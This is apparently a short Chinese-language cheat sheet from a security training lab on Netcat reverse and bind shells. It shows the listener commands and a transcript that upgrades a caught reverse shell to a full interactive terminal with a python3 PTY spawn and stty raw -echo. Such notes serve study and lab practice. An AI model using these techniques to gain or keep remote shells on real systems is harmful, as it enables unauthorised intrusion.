# Netcat

## 反向 SHELL

```shell
$ nc -lvnp <port-number>
```

## 绑定 SHELL

```shell
nc <target-ip> <chosen-port>
```

## 稳定 NC SHELL

> netcat SHELL 在按下 Ctrl+C 时通常会终结当前 SHELL 会话
>
> * 弊端： 不知道怎么关

```shell
┌──(jtz㉿JTZ)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.18.4.251] from (UNKNOWN) [10.10.40.0] 40816
python3 -c 'import pty;pty.spawn("/bin/bash")'  # 获取交互 SHELL
shell@linux-shell-practice:~$ export TERM=xterm
export TERM=xterm
shell@linux-shell-practice:~$ ^Z  # Ctrl+Z
[1]+  Stopped                 nc -nvlp 4444

┌──(jtz㉿JTZ)-[~]
└─$ stty raw -echo; fg
nc -nvlp 4444

shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$
```
